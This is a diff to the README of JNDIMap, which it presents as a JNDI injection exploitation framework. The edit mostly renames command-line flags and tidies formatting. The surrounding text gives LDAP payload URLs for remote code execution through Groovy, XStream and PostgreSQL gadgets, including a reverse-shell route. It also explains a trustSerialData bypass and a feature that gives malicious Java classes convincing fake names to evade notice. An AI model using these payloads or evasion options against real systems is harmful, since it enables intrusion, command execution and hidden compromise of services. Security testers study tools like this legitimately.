@@ -5,31 +5,34 @@
 ## Usage
 
 ```bash
-Usage: JNDIMap.jar [-hV] [-fakeClassName] [-useReferenceOnly] [-f=<file>]
-                   [-i=<ip>] [-j=<jksPath>] [-k=<jksPin>] [-l=<ldapPort>]
-                   [-p=<httpPort>] [-r=<rmiPort>] [-s=<ldapsPort>] [-u=<url>]
+Usage: JNDIMap.jar [-hV] [--confusing-class-name] [--use-reference-only]
+                   [-f=<file>] [-i=<ip>] [-j=<jks-path>] [-k=<jks-pin>]
+                   [-l=<ldap-port>] [-p=<http-port>] [-r=<rmi-port>]
+                   [-s=<ldaps-port>] [-u=<url>]
 JNDI injection exploitation framework
-  -i, --ip=<ip>             IP address (codebase) to listen on
-                              Default: 127.0.0.1
-  -r, --rmiPort=<rmiPort>   RMI server bind port
-                              Default: 1099
-  -l, --ldapPort=<ldapPort> LDAP server bind port
-                              Default: 1389
-  -s, --ldapsPort=<ldapsPort>
-                            LDAPS server bind port
-                              Default: 1636
-  -p, --httpPort=<httpPort> HTTP server bind port
-                              Default: 3456
-  -u, --url=<url>           specify the JNDI route
-  -j, --jksPath=<jksPath>   path to the JKS cert
-  -k, --jksPin=<jksPin>     pin of the JKS cert
-  -f, --file=<file>         path to the custom JS script
-      -useReferenceOnly     directly returns Reference object through LDAP
-                              related parameters
-      -fakeClassName        use random fake class names when generating
-                              malicious Java classes
-  -h, --help                Show this help message and exit.
-  -V, --version             Print version information and exit.
+  -i, --ip=<ip>              IP address (codebase) to listen on
+                               Default: 127.0.0.1
+  -r, --rmi-port=<rmi-port>  RMI server bind port
+                               Default: 1099
+  -l, --ldap-port=<ldap-port>
+                             LDAP server bind port
+                               Default: 1389
+  -s, --ldaps-port=<ldaps-port>
+                             LDAPS server bind port
+                               Default: 1636
+  -p, --http-port=<http-port>
+                             HTTP server bind port
+                               Default: 3456
+  -u, --url=<url>            specify the JNDI route
+  -j, --jks-path=<jks-path>  path to the JKS cert
+  -k, --jks-pin=<jks-pin>    pin of the JKS cert
+  -f, --file=<file>          path to the custom JS script
+      --use-reference-only   directly returns Reference object through LDAP
+                               related parameters
+      --confusing-class-name use confusing class names when generating
+                               malicious Java classes
+  -h, --help                 Show this help message and exit.
+  -V, --version              Print version information and exit.
 ```
 
 `-i`: IP address to listen on (i.e. the codebase, must be specified as an IP that can be reached by the target, e.g. `192.168.1.100`, note that `0.0.0.0` is not available)
@@ -50,11 +53,13 @@ JNDI injection exploitation framework
 
 `-f`: path to the custom JS script, used to write custom JNDI payloads
 
-`-useReferenceOnly`: only applicable to LDAP protocol, directly returns Reference object through LDAP related parameters, used to bypass `com.sun.jndi.ldap.object.trustSerialData`
+`--use-reference-only`: only applicable to LDAP protocol, directly returns Reference object through LDAP related parameters, used to bypass `com.sun.jndi.ldap.object.trustSerialData`
 
-`-fakeClassName`: use random fake class names when generating malicious Java classes, which are highly similar to real projects
+`--confusing-class-name`: use random fake class names when generating malicious Java classes, which are highly similar to real projects
 
 `-h`: show help message
+
+`-V`: show version information
 
 ## URL Format
 
@@ -163,9 +168,10 @@ ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator
 # GroovyShell
 ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
 ```
+
 ### XStream
 
-Use XStream deserialization to achieve RCE
+Use XStream deserialization to achieve RCE (version <= 1.4.15)
 
 The deserialization part uses UIDefaults + SwingLazyValue to trigger the following gadgets in sequence:
 
@@ -178,7 +184,7 @@ The XSLT payload uses Spring's reflection library to call defineClass, so it req
 # XStream Bypass (depends on Spring)
 # Based on arbitrary file write + XSLT loading, there is a probability of failure due to the order of precedence, so you need to try several times
 ldap://127.0.0.1:1389/XStream/Command/open -a Calculator
-````
+```
 
 ### SnakeYaml
 
@@ -347,7 +353,7 @@ ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
 
 # reverse shell
 ldap://127.0.0.1:1389/Factory/PostgreSQL/ReverseShell/127.0.0.1/4444
-````
+```
 
 ### H2
 
@@ -589,7 +595,9 @@ Then trigger via any JNDI URL
 ldap://127.0.0.1:1389/x
 ```
 
-## useReferenceOnly
+## Advanced Techniques
+
+### Use Reference Only
 
 For JNDI injection of the LDAP(s) protocol, if you want to use ObjectFactory to bypass it, the existing methods are to set the javaSerializedData attribute returned by the LDAP protocol to the serialized data of the Reference object
 
@@ -621,20 +629,20 @@ public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
 }
 ```
 
-Just specify the `-useReferenceOnly` parameter when using it
+Just specify the `--use-reference-only` parameter when using it
 
 ```bash
-java -jar JNDIMap.jar -useReferenceOnly
+java -jar JNDIMap.jar --use-reference-only
 ```
 
-## fakeClassName
+### Confusing Class Name
 
 The [classNames](src/main/resources/classNames) directory of JNDIMap contains some fake class names that are highly similar to real projects. These class names are generated based on the [ClassNameObfuscator](https://github.com/X1r0z/ClassNameObfuscator) project and can be used in scenarios related to generating malicious Java classes in JNDI injection
 
-Just specify the `-fakeClassName` parameter when using it
+Just specify the `--confusing-class-name` parameter when using it
 
 ```bash
-java -jar JNDIMap.jar -fakeClassName
+java -jar JNDIMap.jar --confusing-class-name
 ```
 
-When the `-fakeClassName` parameter is not specified, JNDIMap generates a random string in the format `[A-Z]{1}[A-Za-z0-9]{7}` as the malicious class name
+When the `--confusing-class-name` parameter is not specified, JNDIMap generates a random string in the format `[A-Z]{1}[A-Za-z0-9]{7}` as the malicious class name
